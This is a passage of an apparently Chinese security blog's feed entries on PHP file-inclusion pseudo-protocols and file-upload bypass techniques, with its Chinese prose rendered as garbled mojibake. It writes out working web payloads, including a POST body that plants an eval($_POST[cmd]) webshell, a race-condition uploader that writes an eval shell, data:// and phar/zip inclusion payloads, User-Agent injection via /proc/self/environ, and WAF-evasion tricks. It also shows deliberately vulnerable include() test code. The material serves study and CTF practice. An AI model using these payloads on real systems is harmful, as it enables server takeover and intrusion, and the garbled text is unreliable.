title="php://input"></a>php://input</h3><p>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚å³å¯ä»¥ç›´æ¥è¯»å–åˆ°POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚ enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://inputæ˜¯æ— æ•ˆçš„ã€‚</p><p><strong>ç”¨æ³•ï¼š</strong></p><pre><code>?file=php://input æ•°æ®åˆ©ç”¨POSTä¼ è¿‡å»ã€‚</code></pre><h3 id="php-input-ï¼ˆè¯»å–POSTæ•°æ®ï¼‰"><a href="#php-input-ï¼ˆè¯»å–POSTæ•°æ®ï¼‰" class="headerlink" title="php://input ï¼ˆè¯»å–POSTæ•°æ®ï¼‰"></a>php://input ï¼ˆè¯»å–POSTæ•°æ®ï¼‰</h3><p>ç¢°åˆ°file_get_contents()å°±è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ï¼Œå› ä¸ºphpä¼ªåè®®ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨httpåè®®çš„ï¼Œå³å¯ä»¥ä½¿ç”¨POSTæ–¹å¼ä¼ æ•°æ®ï¼Œå…·ä½“å‡½æ•°æ„ä¹‰ä¸‹ä¸€é¡¹ï¼›</p><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ç»“æœï¼š</strong></p><p><img src="/2019/09/20/file-contant-leak/1535362131_5b83c453589ad.png"></p><h3 id="php-inputï¼ˆå†™å…¥æœ¨é©¬ï¼‰"><a href="#php-inputï¼ˆå†™å…¥æœ¨é©¬ï¼‰" class="headerlink" title="php://inputï¼ˆå†™å…¥æœ¨é©¬ï¼‰"></a>php://inputï¼ˆå†™å…¥æœ¨é©¬ï¼‰</h3><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>æ¡ä»¶ï¼š</strong>phpé…ç½®æ–‡ä»¶ä¸­éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_includeï¼ˆPHP &lt; 5.3.0ï¼‰,å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ï¼Œå³POSTè¿‡å»PHPä»£ç ï¼Œå³å¯æ‰§è¡Œã€‚</p><p>å¦‚æœPOSTçš„æ•°æ®æ˜¯æ‰§è¡Œå†™å…¥ä¸€å¥è¯æœ¨é©¬çš„PHPä»£ç ï¼Œå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªæœ¨é©¬ã€‚</p><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362139_5b83c45b1a703.png"></p><p><strong>æµ‹è¯•ç»“æœï¼š</strong></p><p><img src="/2019/09/20/file-contant-leak/1535362160_5b83c470ae2c9.png"></p><p>å¦‚æœä¸å¼€å¯allow_url_includeä¼šæŠ¥é”™ï¼š</p><p><img src="/2019/09/20/file-contant-leak/1535362176_5b83c48090fd4.png"></p><h3 id="php-inputï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰"><a href="#php-inputï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰" class="headerlink" title="php://inputï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰"></a>php://inputï¼ˆå‘½ä»¤æ‰§è¡Œï¼‰</h3><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>æ¡ä»¶ï¼š</strong>phpé…ç½®æ–‡ä»¶ä¸­éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_includeï¼ˆPHP &lt; 5.30ï¼‰,å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ï¼Œå³POSTè¿‡å»PHPä»£ç ï¼Œå³å¯æ‰§è¡Œï¼›</p><p><img src="/2019/09/20/file-contant-leak/1535362228_5b83c4b420691.png"></p><p>å¦‚æœä¸å¼€å¯allow_url_includeä¼šæŠ¥é”™ï¼š</p><p><img src="/2019/09/20/file-contant-leak/1535362242_5b83c4c2bbbc9.png"></p><h3 id="file-ä¼ªåè®®-ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"><a href="#file-ä¼ªåè®®-ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰" class="headerlink" title="file://ä¼ªåè®® ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰"></a>file://ä¼ªåè®® ï¼ˆè¯»å–æ–‡ä»¶å†…å®¹ï¼‰</h3><p>é€šè¿‡fileåè®®å¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè¯»å–åˆ°æ–‡ä»¶çš„å†…å®¹</p><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362266_5b83c4daaa35c.png"></p><h3 id="data-ä¼ªåè®®"><a href="#data-ä¼ªåè®®" class="headerlink" title="data://ä¼ªåè®®"></a>data://ä¼ªåè®®</h3><p>æ•°æ®æµå°è£…å™¨ï¼Œå’Œphp://ç›¸ä¼¼éƒ½æ˜¯åˆ©ç”¨äº†æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œæ–‡ä»¶çš„åŒ…å«æ–¹æ³•åŒ…å«äº†ä½ çš„è¾“å…¥æµï¼Œé€šè¿‡ä½ è¾“å…¥payloadæ¥å®ç°ç›®çš„ï¼›</p><pre><code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4data://ï¼ˆè¯»å–æ–‡ä»¶ï¼‰</code></pre><p>å’Œphpä¼ªåè®®çš„inputç±»ä¼¼ï¼Œç¢°åˆ°file_get_contents()æ¥ç”¨ï¼›</p><pre><code>&lt;?php // æ‰“å° â€œI love PHPâ€ echo file_get_contents(â€˜data://textplain;base64,SSBsb3ZlIFBIUAo=â€™); ?&gt;æ³¨æ„ï¼š&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,è¿™ç±»æ‰§è¡Œä»£ç æœ€åæ²¡æœ‰?&gt;&lt;/span&gt;é—­åˆ;</code></pre><p>å¦‚æœphp.inié‡Œçš„allow_url_include=Onï¼ˆPHP &lt; 5.3.0ï¼‰,å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼ŒåŒç†åœ¨è¿™å°±å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362287_5b83c4efe99a7.png"></p><h3 id="phar-ä¼ªåè®®"><a href="#phar-ä¼ªåè®®" class="headerlink" title="phar://ä¼ªåè®®"></a>phar://ä¼ªåè®®</h3><p>è¿™ä¸ªå‚æ•°æ˜¯å°±æ˜¯phpè§£å‹ç¼©åŒ…çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå½“åšå‹ç¼©åŒ…æ¥è§£å‹ã€‚</p><p><strong>ç”¨æ³•ï¼š</strong></p><pre><code>?file=phar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶ phar://xxx.png/shell.php æ³¨æ„ï¼š PHP &gt; =5.3.0 å‹ç¼©åŒ…éœ€è¦æ˜¯zipåè®®å‹ç¼©ï¼Œrarä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ æ­¥éª¤ï¼š å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶shell.phpï¼Œç„¶åç”¨zipåè®®å‹ç¼©ä¸ºshell.zipï¼Œç„¶åå°†åç¼€æ”¹ä¸ºpngç­‰å…¶ä»–æ ¼å¼ã€‚ </code></pre><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362303_5b83c4ff6a90e.png"></p><h3 id="zip-ä¼ªåè®®"><a href="#zip-ä¼ªåè®®" class="headerlink" title="zip://ä¼ªåè®®"></a>zip://ä¼ªåè®®</h3><p>zipä¼ªåè®®å’Œpharåè®®ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·ã€‚</p><p><strong>ç”¨æ³•ï¼š</strong></p><pre><code>?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] zip://xxx.png#shell.phpã€‚æ¡ä»¶ï¼š PHP &gt; =5.3.0ï¼Œæ³¨æ„åœ¨windowsä¸‹æµ‹è¯•è¦5.3.0&lt;PHP&lt;5.4 æ‰å¯ä»¥ #åœ¨æµè§ˆå™¨ä¸­è¦ç¼–ç ä¸º%23ï¼Œå¦åˆ™æµè§ˆå™¨é»˜è®¤ä¸ä¼šä¼ è¾“ç‰¹æ®Šå­—ç¬¦ã€‚æµ‹è¯•ä»£ç ï¼š</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362318_5b83c50e8872e.png"></p><h2 id="æ–‡ä»¶åŒ…å«çš„ä¸€äº›éªšæ“ä½œ"><a href="#æ–‡ä»¶åŒ…å«çš„ä¸€äº›éªšæ“ä½œ" class="headerlink" title="æ–‡ä»¶åŒ…å«çš„ä¸€äº›éªšæ“ä½œ"></a>æ–‡ä»¶åŒ…å«çš„ä¸€äº›éªšæ“ä½œ</h2><h3 id="åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶"><a href="#åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶"></a>åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶</h3><p><code>/proc/self/environ</code>æ–‡ä»¶ï¼š</p><p>å‘User-Agentå¤´ä¸­æ³¨å…¥PHPä»£ç ï¼ŒåŒ…å«æˆåŠŸå°±èƒ½å¾—åˆ°shell</p><p>è¿™ä¸ª self ä¸è¦ä»¥ä¸ºå°±æ˜¯ self æ–‡ä»¶å¤¹ï¼Œå®é™…ä¸Šå­ç›®å½•/proc/selfæœ¬èº«å°±æ˜¯å½“å‰è¿è¡Œè¿›ç¨‹ PID</p><h3 id="è´ªå©ªåŒ…å«"><a href="#è´ªå©ªåŒ…å«" class="headerlink" title="è´ªå©ªåŒ…å«"></a>è´ªå©ªåŒ…å«</h3><p>ä¸€ä¸ªpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;..&#x2F;flag.php|jpg</span><br></pre></td></tr></table></figure><h3 id="data-åè®®"><a href="#data-åè®®" class="headerlink" title="data://åè®®"></a>data://åè®®</h3><p><em>åˆ©ç”¨æ¡ä»¶ï¼š</em></p><p>1ã€php ç‰ˆæœ¬å¤§äºç­‰äº php5.2</p><p>2ã€allow_url_fopen = On</p><p>3ã€allow_url_include = On</p><p>åˆ©ç”¨ data:// ä¼ªåè®®è¿›è¡Œä»£ç æ‰§è¡Œçš„æ€è·¯åŸç†å’Œ php:// æ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨äº† PHP ä¸­çš„æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„ include çš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,base64ç¼–ç çš„payload</span><br><span class="line">index.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p>åŠ å· + çš„ url ç¼–ç ä¸º %2bï¼Œ<code>PD9waHAgcGhwaW5mbygpOz8+</code> çš„ base64 è§£ç ä¸ºï¼š<code>&lt;?php phpinfo();?&gt;</code></p><h3 id="è·¯å¾„é•¿åº¦æˆªæ–­-1"><a href="#è·¯å¾„é•¿åº¦æˆªæ–­-1" class="headerlink" title="è·¯å¾„é•¿åº¦æˆªæ–­"></a>è·¯å¾„é•¿åº¦æˆªæ–­</h3><p>è¿™ä¸ªè¦æ±‚phpç‰ˆæœ¬&lt; 5.3.10</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;../flag.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;pages/&#x27;</span>.(<span class="keyword">isset</span>($_GET[<span class="string">&quot;file&quot;</span>])?$_GET[<span class="string">&quot;file&quot;</span>]:<span class="string">&quot;welcome.txt&quot;</span>).<span class="string">&#x27;.html&#x27;</span>; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag æ–‡ä»¶æ”¾åœ¨ä¸Šå±‚ç›®å½• è¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å­—ç¬¦ <code>./.</code> å’Œ <code>./</code> æ¥è¿›è¡Œç»•è¿‡ï¼Œå› ä¸ºæ–‡ä»¶è·¯å¾„æœ‰é•¿åº¦é™åˆ¶</p><p><code>windows 259 ä¸ª bytes</code></p><p><code>linux 4096 ä¸ª bytes</code></p><p>å‚è€ƒï¼š<br><a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ åŠå…¶åˆ©ç”¨æ–¹å¼</title>
      <link href="2019/09/10/file-upload-leak/"/>
      <url>2019/09/10/file-upload-leak/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´åŠä¸€äº›å¸¸è§çš„åˆ©ç”¨æ–¹å¼ï¼ŒåŒ…æ‹¬ä¸€äº›ç®€å•çš„ç»•è¿‡æ–¹å¼ï¼Œä¸€äº›å¸¸è§çš„ç½‘ç«™å®¹å™¨è§£ææ¼æ´ï¼Œä»¥åŠå›¾ç‰‡é©¬çš„åˆ¶ä½œå’Œä½¿ç”¨ç­‰ç­‰ï¼</p><a id="more"></a><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡å¯¹ç”¨æˆ·æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†çš„æ§åˆ¶ä¸è¶³æˆ–è€…å¤„ç†ç¼ºé™·ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™å‘æœåŠ¡å™¨ä¸Šä¸Šä¼ å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚</p><h2 id="å®¢æˆ·ç«¯æ ¡éªŒ"><a href="#å®¢æˆ·ç«¯æ ¡éªŒ" class="headerlink" title="å®¢æˆ·ç«¯æ ¡éªŒ"></a>å®¢æˆ·ç«¯æ ¡éªŒ</h2><h3 id="æœ¬åœ°jsæ£€æµ‹"><a href="#æœ¬åœ°jsæ£€æµ‹" class="headerlink" title="æœ¬åœ°jsæ£€æµ‹"></a>æœ¬åœ°jsæ£€æµ‹</h3><p>åœ¨ä¸Šä¼ æ—¶ï¼Œæ•°æ®è¿˜æœªå‘é€è¿‡å»ï¼Œä¾¿å‘å‡ºè­¦å‘Š</p><p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p><ol><li>å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶æ”¹ä¸ºå¯ä»¥ä¸Šä¼ çš„æ‰©å±•åï¼Œä¸Šä¼ æ—¶ä½¿ç”¨Burpsuiteæ‹¦æˆªæ•°æ®åŒ…ï¼Œå°†æœ¨é©¬çš„æ‰©å±•åæ”¹ä¸ºåŸæ¥çš„php,å³å¯ç»•è¿‡å®¢æˆ·ç«¯çš„éªŒè¯</li><li>F12ä¿®æ”¹jsä»£ç </li></ol><h2 id="æœåŠ¡ç«¯æ ¡éªŒ"><a href="#æœåŠ¡ç«¯æ ¡éªŒ" class="headerlink" title="æœåŠ¡ç«¯æ ¡éªŒ"></a>æœåŠ¡ç«¯æ ¡éªŒ</h2><h3 id="MIMEç±»å‹æ£€æµ‹"><a href="#MIMEç±»å‹æ£€æµ‹" class="headerlink" title="MIMEç±»å‹æ£€æµ‹"></a>MIMEç±»å‹æ£€æµ‹</h3><p>MIMEç±»å‹æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åœ¨æŠŠè¾“å‡ºç»“æœä¼ é€åˆ°æµè§ˆå™¨ä¸Šçš„æ—¶å€™ï¼Œæµè§ˆå™¨å¿…é¡»å¯åŠ¨åº”ç”¨ç¨‹åºæ¥å¤„ç†è¿™ä¸ªè¾“å‡ºæ–‡æ¡£ã€‚è¿™å¯ä»¥é€šè¿‡å¤šç§ç±»å‹MIMEï¼ˆå¤šåŠŸèƒ½ç½‘é™…é‚®ä»¶æ‰©å……åè®®ï¼‰æ¥å®Œæˆã€‚<br>åœ¨HTTPä¸­ï¼ŒMIMEç±»å‹è¢«å®šä¹‰åœ¨Content-Type headerä¸­ã€‚</p><p>å¸¸è§çš„MIMEç±»å‹ï¼š</p><pre><code>.html          text/html .txt          text/plain .gif          image/gif .jpg          image/jpeg   .png          image/png  </code></pre><p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p><p>é€šè¿‡burpsuiteæ¥ä¿®æ”¹æ–‡ä»¶çš„ç±»å‹(Content-Type)è¿›è¡Œè¿‡æ»¤å³å¯</p><h3 id="æ–‡ä»¶å†…å®¹å¤´æ£€æµ‹"><a href="#æ–‡ä»¶å†…å®¹å¤´æ£€æµ‹" class="headerlink" title="æ–‡ä»¶å†…å®¹å¤´æ£€æµ‹"></a>æ–‡ä»¶å†…å®¹å¤´æ£€æµ‹</h3><p>é€šè¿‡æ£€æµ‹æ–‡ä»¶å¤´å†…å®¹åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶çš„åˆæ³•æ€§</p><p><img src="/2019/09/10/file-upload-leak/20190924145404.png"></p><p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong></p><p>åœ¨æ¶æ„è„šæœ¬å‰åŠ ä¸Šå…è®¸ä¸Šä¼ æ–‡ä»¶çš„å¤´æ ‡è¯†(æ¯”å¦‚GIF89aï¼Œä¼šè§£ææˆgifæ–‡ä»¶)</p><h3 id="é»‘åå•ä¸ç™½åå•"><a href="#é»‘åå•ä¸ç™½åå•" class="headerlink" title="é»‘åå•ä¸ç™½åå•"></a>é»‘åå•ä¸ç™½åå•</h3><p>é€šè¿‡åˆ¤æ–­åç¼€åæ¥ç¡®å®šä¸Šä¼ æ–‡ä»¶çš„åˆæ³•æ€§</p><p><strong>é»‘åå•ç»•è¿‡æ–¹æ³•ï¼š</strong></p><ol><li>å¤§å°å†™ç»•è¿‡ï¼Œä¾‹å¦‚Phpã€PhP</li><li>åˆ©ç”¨é»‘åå•ä¸­æ²¡æœ‰çš„ï¼Œä½†æ˜¯åˆèƒ½å¤Ÿè¢«è§£æçš„åç¼€åï¼Œä¾‹å¦‚phpã€ php3ã€ php4ã€php5ã€php7ã€phtã€phtmlã€phps</li><li>é…åˆè§£æåˆ©ç”¨æ–¹æ³•ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶å½“ä½œphpä»£ç æ‰§è¡Œ</li><li>ä½¿ç”¨00æˆªæ–­(åŸºäºä¸€ä¸ªç»„åˆé€»è¾‘æ¼æ´é€ æˆçš„ï¼Œé€šå¸¸å­˜åœ¨äºæ„é€ ä¸Šä¼ æ–‡ä»¶è·¯å¾„çš„æ—¶å€™)<br><img src="/2019/09/10/file-upload-leak/20190924142619.png"></li><li>è¶…é•¿æ–‡ä»¶åæˆªæ–­ä¸Šä¼ (windows 258byte | linux 4096byte)<br>ç™½åå•ç»•è¿‡æ–¹æ³•ä¸å¤ªå¥½ç»•è¿‡ï¼Œä¸€èˆ¬éƒ½æ˜¯é…åˆè§£ææ¼æ´</li></ol><h2 id="wafç»•è¿‡å§¿åŠ¿"><a href="#wafç»•è¿‡å§¿åŠ¿" class="headerlink" title="wafç»•è¿‡å§¿åŠ¿"></a>wafç»•è¿‡å§¿åŠ¿</h2><h3 id="ç«äº‰ä¸Šä¼ "><a href="#ç«äº‰ä¸Šä¼ " class="headerlink" title="ç«äº‰ä¸Šä¼ "></a>ç«äº‰ä¸Šä¼ </h3><p><strong>æƒ…æ™¯ï¼š</strong></p><p>æ–‡ä»¶ä¸Šä¼ åï¼Œæ£€æµ‹æ˜¯å¦åˆæ³•ï¼Œä¸åˆæ³•å°±åˆ é™¤</p><p><strong>åˆ©ç”¨æ–¹å¼ï¼š</strong></p><p>åœ¨åˆ é™¤å‰è®¿é—®åˆ°ä¸Šä¼ çš„æ–‡ä»¶</p><pre><code>&lt;?php $file = &#39;web.php&#39;; $shell = &#39;&lt;?php eval($_POST[&quot;key&quot;])?&gt;&#39;; file_put_contents($file,$shell); ?&gt;</code></pre><p>ç”¨bpåŒæ—¶ä¸Šä¼ å’Œè®¿é—®ï¼Œè™½ç„¶ä¸Šä¼ çš„æ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œä½†å¯ä»¥é€šè¿‡è®¿é—®web.php</p><h3 id="åŒæ–‡ä»¶ä¸Šä¼ "><a href="#åŒæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="åŒæ–‡ä»¶ä¸Šä¼ "></a>åŒæ–‡ä»¶ä¸Šä¼ </h3><p>åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œå³é”®å®¡æŸ¥å…ƒç´ ï¼Œé¦–å…ˆä¿®æ”¹actionä¸ºå®Œæ•´è·¯å¾„ï¼Œç„¶åå¤åˆ¶ç²˜è´´ä¸Šä¼ æµè§ˆæ–‡ä»¶ï¼ˆ&lt;input â€¦â€¦ï¼‰ï¼Œè¿™æ ·å°±ä¼šå‡ºç°ä¸¤ä¸ªä¸Šä¼ æ¡†ï¼Œç¬¬ä¸€ä¸ªä¸Šä¼ æ­£å¸¸æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªé€‰æ‹©ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæäº¤ã€‚</p><h3 id="åƒåœ¾æ•°æ®"><a href="#åƒåœ¾æ•°æ®" class="headerlink" title="åƒåœ¾æ•°æ®"></a>åƒåœ¾æ•°æ®</h3><p>æœ‰äº›ä¸»æœºWAFè½¯ä»¶ä¸ºäº†ä¸å½±å“webæœåŠ¡å™¨çš„æ€§èƒ½ï¼Œä¼šå¯¹æ ¡éªŒçš„ç”¨æˆ·æ•°æ®è®¾ç½®å¤§å°ä¸Šé™ï¼Œæ¯”å¦‚1Mã€‚æ­¤ç§æƒ…å†µå¯ä»¥æ„é€ ä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œå‰é¢1Mçš„å†…å®¹ä¸ºåƒåœ¾å†…å®¹ï¼Œåé¢æ‰æ˜¯çœŸæ­£çš„æœ¨é©¬å†…å®¹ï¼Œä¾¿å¯ä»¥ç»•è¿‡WAFå¯¹æ–‡ä»¶å†…å®¹çš„æ ¡éªŒï¼›</p><p><img src="/2019/09/10/file-upload-leak/12315544664.png"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥å°†åƒåœ¾æ•°æ®æ”¾åœ¨æ•°æ®åŒ…æœ€å¼€å¤´ï¼Œè¿™æ ·ä¾¿å¯ä»¥ç»•è¿‡å¯¹æ–‡ä»¶åçš„æ ¡éªŒã€‚</p><p><img src="/2019/09/10/file-upload-leak/2654984841.png"></p><h3 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h3><p>é’ˆå¯¹æ—©æœŸç‰ˆæœ¬å®‰å…¨ç‹—ï¼Œå¯ä»¥å¤šåŠ ä¸€ä¸ªfilename</p><p><img src="/2019/09/10/file-upload-leak/3.png"></p><p>æˆ–è€…å°†filenameæ¢ä½ç½®ï¼Œåœ¨IIS6.0ä¸‹å¦‚æœæˆ‘ä»¬æ¢ä¸€ç§ä¹¦å†™æ–¹å¼ï¼ŒæŠŠfilenameæ”¾åœ¨å…¶ä»–åœ°æ–¹ï¼š</p><p><img src="/2019/09/10/file-upload-leak/13.png"></p><h3 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST/GET"></a>POST/GET</h3><p>æœ‰äº›WAFçš„è§„åˆ™æ˜¯ï¼šå¦‚æœæ•°æ®åŒ…ä¸ºPOSTç±»å‹ï¼Œåˆ™æ ¡éªŒæ•°æ®åŒ…å†…å®¹ã€‚<br>æ­¤ç§æƒ…å†µå¯ä»¥ä¸Šä¼ ä¸€ä¸ªPOSTå‹çš„æ•°æ®åŒ…ï¼ŒæŠ“åŒ…å°†POSTæ”¹ä¸ºGETã€‚</p><h3 id="æ–‡ä»¶é‡å‘½åç»•è¿‡"><a href="#æ–‡ä»¶é‡å‘½åç»•è¿‡" class="headerlink" 